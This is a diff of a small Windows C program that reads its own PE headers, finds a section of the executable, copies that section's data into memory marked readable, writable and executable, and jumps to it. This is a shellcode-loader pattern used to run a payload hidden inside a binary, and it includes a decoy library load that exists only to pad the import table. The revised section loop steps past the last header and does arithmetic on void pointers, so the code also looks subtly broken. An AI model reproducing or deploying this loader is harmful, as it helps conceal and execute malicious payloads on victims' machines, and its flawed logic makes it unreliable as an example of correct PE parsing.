@@ -2,41 +2,45 @@
 
 int main(int argc, char const *argv[])
 {
-
-    // Just for the imports
     HMODULE k32 = LoadLibrary("USER32.dll");
     GetProcAddress(k32, "VirtualAlloc");
 
-    // Get module handle
     LPVOID moduleHandle = GetModuleHandle(NULL);
     if (moduleHandle == NULL)
         return 1;
 
-    PIMAGE_DOS_HEADER dosHeader = {};
-    PIMAGE_SECTION_HEADER sectionHeader = {};
-    dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
+    PIMAGE_NT_HEADERS32 imageNTHeaders32 = NULL;
+    PIMAGE_NT_HEADERS64 imageNTHeaders64 = NULL;
+    LPVOID sectionLocation = NULL;
 
-#if defined(__MINGW64__) || defined(_WIN64)
-    PIMAGE_NT_HEADERS64 imageNTHeaders = {};
-    imageNTHeaders = (PIMAGE_NT_HEADERS64)(moduleHandle + dosHeader->e_lfanew);
-    __int64 sectionLocation = (__int64)((__int64)(&imageNTHeaders->OptionalHeader) + (WORD)imageNTHeaders->FileHeader.SizeOfOptionalHeader);
-    FlushInstructionCache(moduleHandle, NULL, NULL);
-#else
-    PIMAGE_NT_HEADERS imageNTHeaders = {};
-    imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)moduleHandle + dosHeader->e_lfanew);
-    DWORD sectionLocation = (DWORD) & (imageNTHeaders->OptionalHeader) + (WORD)imageNTHeaders->FileHeader.SizeOfOptionalHeader;
-#endif
-
-    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER);
-    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
+    if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE)
     {
-        sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
-        sectionLocation += sectionSize;
+#if defined(__MINGW64__) || defined(_WIN64)
+        imageNTHeaders64 = (PIMAGE_NT_HEADERS64)((BYTE *)moduleHandle + dosHeader->e_lfanew);
+        sectionLocation = (LPVOID)(&imageNTHeaders64->OptionalHeader) + imageNTHeaders64->FileHeader.SizeOfOptionalHeader;
+#else
+        imageNTHeaders32 = (PIMAGE_NT_HEADERS32)((BYTE *)moduleHandle + dosHeader->e_lfanew);
+        sectionLocation = (LPVOID)(&imageNTHeaders32->OptionalHeader) + imageNTHeaders32->FileHeader.SizeOfOptionalHeader;
+#endif
     }
-    // Execute last section data
+
+    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
+
+    for (int i = 0; i < (imageNTHeaders32 ? imageNTHeaders32->FileHeader.NumberOfSections : imageNTHeaders64->FileHeader.NumberOfSections); i++)
+    {
+        sectionHeader++;
+    }
+
     unsigned char *buffer = (unsigned char *)VirtualAlloc(NULL, sectionHeader->SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy((void *)buffer, (void *)(sectionHeader->VirtualAddress + imageNTHeaders->OptionalHeader.ImageBase), sectionHeader->SizeOfRawData);
-    (*(void (*)())buffer)();
+
+    if (buffer)
+    {
+        LPVOID sectionDataAddress = (LPVOID)((DWORD_PTR)sectionHeader->VirtualAddress + (imageNTHeaders32 ? imageNTHeaders32->OptionalHeader.ImageBase : imageNTHeaders64->OptionalHeader.ImageBase));
+        memcpy(buffer, sectionDataAddress, sectionHeader->SizeOfRawData);
+        ((void (*)())buffer)();
+        VirtualFree(buffer, 0, MEM_RELEASE);
+    }
 
     return 0;
 }
